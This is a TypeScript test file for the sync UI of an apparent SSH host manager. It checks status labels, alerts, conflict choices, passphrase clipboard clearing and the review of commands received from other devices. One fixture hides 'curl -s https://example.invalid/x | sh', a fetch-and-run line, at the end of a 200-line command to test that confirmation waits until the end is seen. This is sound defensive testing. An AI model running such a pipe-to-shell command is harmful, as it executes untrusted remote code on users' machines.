// Checks of the folder sync wording and helpers (src/lib/syncview.ts), run
// by `pnpm check`. Node's built-in test runner, no dependency.
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";
import type { AlertKind, ConflictSide, FolderReason, SyncStatus } from "../src/lib/api.ts";
import { codeSpans, sentence } from "../src/lib/api.ts";
import { CLIPBOARD_CLEAR_MS, COPIED_NOTE, copySecret } from "../src/lib/secretclip.ts";
import {
  ago,
  commandLines,
  commandStats,
  conflictRows,
  countsText,
  defaultChoice,
  destination,
  deviceName,
  explainAlert,
  explainFolder,
  JOIN_TTL_MS,
  probeVerdict,
  scrolledToEnd,
  strengthView,
  syncLabel,
  validityLeft,
} from "../src/lib/syncview.ts";

const source = (path: string) => readFileSync(new URL(`../src/lib/${path}`, import.meta.url), "utf8");

const NOW = 1_800_000_000_000;
const secs = NOW / 1000;

test("relative times read like the TUI's", () => {
  assert.equal(ago(secs - 10, NOW), "just now");
  assert.equal(ago(secs - 120, NOW), "2 min ago");
  assert.equal(ago(secs - 3 * 3600, NOW), "3 h ago");
  assert.equal(ago(secs - 2 * 86400, NOW), "2 d ago");
  // A clock ahead of ours never shows a negative time.
  assert.equal(ago(secs + 500, NOW), "just now");
});

test("every status has a label and a tone", () => {
  const cases: [SyncStatus, string, string][] = [
    [{ state: "disabled" }, "Sync off", "muted"],
    [{ state: "locked" }, "Sync locked", "warning"],
    [{ state: "idle", last_pass: secs - 120, devices: 2, conflicts: 0, issues: 0, pending_confirmations: 0 }, "Synced 2 min ago", "quiet"],
    [{ state: "syncing" }, "Syncing…", "busy"],
    // The name only: the id is in the item's title.
    [{ state: "waiting", reason: "placeholder", device: "laptop (3f9c0ae1)" }, "Waiting for laptop", "busy"],
    [{ state: "folder_unavailable", reason: "missing" }, "Sync folder unavailable", "warning"],
    [{ state: "alert", kind: "fork", device: null }, "Sync alert", "error"],
    [{ state: "error", summary: { code: "sync_corrupt", message: "x", hint: null } }, "Sync failed", "error"],
  ];
  for (const [status, label, tone] of cases) assert.deepEqual(syncLabel(status, NOW), { label, tone });
});

test("alerts name the device and say what to do", () => {
  const kinds: AlertKind[] = [
    "rollback",
    "fork",
    "restored",
    "bundle_tampered",
    "keys_rotated_elsewhere",
    "passphrase_changed",
    "third_party_claim",
    "merge_refused",
    "divergent",
    "dropped_values",
  ];
  for (const kind of kinds) {
    const e = explainAlert(kind, "laptop (3f9c0ae1)");
    assert.ok(e.title && e.hint, kind);
  }
  assert.match(explainAlert("passphrase_changed", "laptop (3f9c0ae1)").body, /laptop \(3f9c0ae1\)/);
  assert.match(explainAlert("fork", null).body, /another device/);
  const reasons: FolderReason[] = ["missing", "not_mounted", "permission_denied", "bundle_missing", "unsafe", "too_many_entries"];
  for (const r of reasons) assert.ok(explainFolder(r).hint, r);
});

test("probe verdicts", () => {
  assert.equal(probeVerdict({ kind: "usable" }).tone, "ok");
  assert.equal(probeVerdict({ kind: "existing_bundle", devices: 1 }).title, "A Portico sync with 1 device");
  assert.equal(probeVerdict({ kind: "incomplete" }).tone, "wait");
  const refused = probeVerdict({ kind: "refused", summary: { code: "sync_folder_unsafe", message: "inside ~/.ssh", hint: "Choose another" } });
  assert.deepEqual([refused.tone, refused.title, refused.hint], ["error", "inside ~/.ssh", "Choose another"]);
});

test("the meter follows the core's verdict, not its own guess", () => {
  assert.equal(strengthView(80, false).tone, "weak");
  assert.equal(strengthView(62, true).tone, "fair");
  assert.equal(strengthView(90, true).tone, "good");
  assert.ok(strengthView(0, false).fill > 0);
  assert.equal(strengthView(500, true).fill, 1);
});

const side = (index: number, value: ConflictSide["value"], local = false): ConflictSide => ({ index, devices: [local ? "me (00000000)" : "laptop (3f9c0ae1)"], local, at: secs, value });

test("tags preselect the union, snippets keep both, other records this device's side", () => {
  assert.deepEqual(defaultChoice([side(0, { type: "tags", value: ["a"] }, true), side(1, { type: "tags", value: ["b"] })]), { type: "union" });
  const snippet = { name: "x", command: "ls", description: null, run: true };
  assert.deepEqual(defaultChoice([side(0, { type: "snippet", value: snippet }), side(1, { type: "snippet", value: { ...snippet, command: "ls -l" } }, true)]), {
    type: "keep_both",
    keep: 1,
  });
  assert.deepEqual(defaultChoice([side(0, { type: "text", value: "a" }), side(1, { type: "text", value: "b" }, true)]), { type: "pick", index: 1 });
});

test("conflict rows mark the fields that differ", () => {
  const host = { hostname: "a.example", user: "ops", port: null, identity_file: null, proxy_jump: null };
  const rows = conflictRows([side(0, { type: "host", value: host }, true), side(1, { type: "host", value: { ...host, port: 2222 } })]);
  const port = rows.find((r) => r.field === "Port");
  assert.deepEqual(port, { field: "Port", values: ["—", "2222"], differs: true });
  assert.equal(rows.find((r) => r.field === "HostName")?.differs, false);
  const deleted = conflictRows([side(0, { type: "host", value: host }), side(1, { type: "deleted" })]);
  assert.equal(deleted[0]?.values[1], "(deleted)");
});

test("destinations read like ssh", () => {
  assert.equal(destination({ hostname: "h", user: "u", port: 22, identity_file: null, proxy_jump: "b" }), "u@h via b");
  assert.equal(destination({ hostname: "h", user: null, port: 2222, identity_file: null, proxy_jump: null }), "h:2222");
});

test("device names drop the id where room is short; counts read as words", () => {
  assert.equal(deviceName("studio-mac (3f9c0ae1)"), "studio-mac");
  assert.equal(deviceName("studio-mac"), "studio-mac");
  assert.equal(countsText(2, 3), "2 conflicts · 3 to review");
  assert.equal(countsText(1, 0), "1 conflict");
  assert.equal(countsText(0, 1), "1 to review");
});

test("the join review says how long it stays valid", () => {
  assert.equal(validityLeft(NOW, NOW), "Valid for 10 more min");
  assert.equal(validityLeft(NOW, NOW + 9.5 * 60_000), "Valid for 1 more min");
  assert.equal(validityLeft(NOW, NOW + JOIN_TTL_MS), "Expired");
});

// ── A received command (S1c review A1, A2) ──

const LONG = Array.from({ length: 200 }, (_, i) => (i === 199 ? "curl -s https://example.invalid/x | sh" : `echo step ${i + 1}`)).join("\n");

test("a received command shows its line and character counts", () => {
  assert.equal(commandStats("ls"), "1 line · 2 characters");
  assert.equal(commandStats(LONG).split(" · ")[0], "200 lines");
  assert.match(commandStats(LONG), /^200 lines · [\d,]+ characters$/);
  // A trailing newline is an extra Enter: a numbered, empty last line.
  assert.equal(commandLines("ls\n").length, 2);
  assert.deepEqual(commandLines("ls\n")[1], []);
});

test("a received command shows its tabs and control characters", () => {
  const [line] = commandLines("a\tb\rc\u001b[0m");
  assert.deepEqual(line, [
    { text: "a", mark: null },
    { text: "\t", mark: "→" },
    { text: "b", mark: null },
    { text: "\r", mark: "␍" },
    { text: "c", mark: null },
    { text: "\u001b", mark: "␛" },
    { text: "[0m", mark: null },
  ]);
  // Nothing is dropped: the pieces put back are the command.
  assert.equal(commandLines("x\ty\nz").map((l) => l.map((p) => p.text).join("")).join("\n"), "x\ty\nz");
});

test("a long received command is confirmable only once its end was on screen", () => {
  // 200 lines of 21 px in a 320 px box: at the top, not at the end.
  const lineHeight = 21;
  const scrollHeight = 200 * lineHeight;
  assert.equal(scrolledToEnd(0, 320, scrollHeight), false);
  assert.equal(scrolledToEnd(scrollHeight - 320 - 40, 320, scrollHeight), false);
  assert.equal(scrolledToEnd(scrollHeight - 320, 320, scrollHeight), true);
  // Rounding of fractional scroll positions.
  assert.equal(scrolledToEnd(scrollHeight - 320.6, 320, scrollHeight), true);
  // A short command does not scroll: confirmable at once.
  assert.equal(scrolledToEnd(0, 320, 84), true);
  // The review wires it: Confirm (button and `y`) waits for `seenEnd`,
  // reset with a new content, and the counts are shown.
  const review = source("components/SyncReview.svelte");
  assert.match(review, /const confirmable = \$derived\([^)]*seenEnd\)/);
  assert.match(review, /disabled=\{!confirmable\}/);
  assert.match(review, /if \(confirm && !confirmable\) return;/);
  assert.match(review, /data-testid="sync-snippet-stats">\{commandStats\(/);
  assert.match(review, /seenEnd = false;/);
  // y / n, never c / r, never Enter.
  assert.match(review, /key === "y"/);
  assert.doesNotMatch(review, /key === "c"|key === "Enter"/);
});

// ── Received hosts (S1c review A6) ──

test("received hosts start unticked, with no select-all", () => {
  const received = source("components/SyncReceived.svelte");
  assert.match(received, /let ticked: Record<string, boolean> = \$state\(\{\}\);/);
  assert.doesNotMatch(received, /select all|selectAll|select-all/i);
  // Each host is ticked on its own checkbox, next to its destination.
  assert.match(received, /bind:checked=\{ticked\[keyOf\(p\)\]\}/);
});

// ── Generated passphrase (S1c review A3, A4) ──

test("a generated passphrase is dropped in Rust when its dialog closes", () => {
  for (const file of ["components/SyncWizard.svelte", "components/SyncForms.svelte"]) {
    assert.match(source(file), /onDestroy\(\(\) => void backend\.syncForgetGenerated\(\)/, file);
  }
  assert.match(source("components/SyncPassphraseFields.svelte"), /function typeOwn\(\) \{[^}]*syncForgetGenerated\(\)/);
});

function fakeClipboard(readable = true) {
  const clip = {
    text: "",
    writes: [] as string[],
    async writeText(t: string) {
      clip.text = t;
      clip.writes.push(t);
    },
    readText: readable
      ? async () => clip.text
      : async () => {
          throw new Error("not allowed");
        },
  };
  return clip;
}

function manualTimer() {
  const pending: { run: () => void; ms: number }[] = [];
  return { schedule: (run: () => void, ms: number) => pending.push({ run, ms }), pending };
}

test("a copied passphrase leaves the clipboard after 30 s", async () => {
  assert.equal(COPIED_NOTE, "Copied — cleared from the clipboard in 30 s");
  const clip = fakeClipboard();
  const timer = manualTimer();
  const { cleared } = await copySecret("alpha bravo charlie", clip, timer.schedule);
  assert.equal(clip.text, "alpha bravo charlie");
  assert.equal(timer.pending[0]?.ms, CLIPBOARD_CLEAR_MS);
  timer.pending[0]?.run();
  assert.equal(await cleared, true);
  assert.equal(clip.text, "");
});

test("the clipboard is left alone once the user copied something else", async () => {
  const clip = fakeClipboard();
  const timer = manualTimer();
  const { cleared } = await copySecret("alpha bravo charlie", clip, timer.schedule);
  clip.text = "something the user copied";
  timer.pending[0]?.run();
  assert.equal(await cleared, false);
  assert.equal(clip.text, "something the user copied");
});

test("an unreadable clipboard is emptied only by the latest copy", async () => {
  const clip = fakeClipboard(false);
  const timer = manualTimer();
  const first = await copySecret("first secret words", clip, timer.schedule);
  const second = await copySecret("second secret words", clip, timer.schedule);
  timer.pending[0]?.run();
  assert.equal(await first.cleared, false);
  assert.equal(clip.text, "second secret words");
  timer.pending[1]?.run();
  assert.equal(await second.cleared, true);
  assert.equal(clip.text, "");
});

// ── Core messages (S1c review B2) ──

test("an alias leading a core message is never capitalized", () => {
  // The core puts identifiers in backticks: `sentence` leaves them as written.
  assert.equal(sentence("`legacy` is already defined"), "`legacy` is already defined");
  assert.deepEqual(codeSpans(sentence("`legacy` is already defined")), [
    { text: "legacy", code: true },
    { text: " is already defined", code: false },
  ]);
  assert.equal(sentence("received host `legacy` is hidden"), "Received host `legacy` is hidden");
});

// ── Conflicts (S1c review A5) ──

test("a conflict choice is bound to the sides shown", () => {
  const conflicts = source("components/SyncConflicts.svelte");
  // Choices are keyed by id and sides hash: new sides start from the default.
  assert.match(conflicts, /const keyOf = \(c: SyncConflict\) => `\$\{c\.id\}\\u0000\$\{c\.sides_hash\}`/);
  assert.match(conflicts, /choices\[keyOf\(c\)\] \?\? defaultChoice\(c\.sides\)/);
  assert.match(conflicts, /if \(!live\.has\(k\)\) delete choices\[k\]/);
  // The resolution names the sides it was chosen for.
  assert.match(conflicts, /backend\.syncResolve\(c\.id, choiceOf\(c\), c\.sides_hash\)/);
});
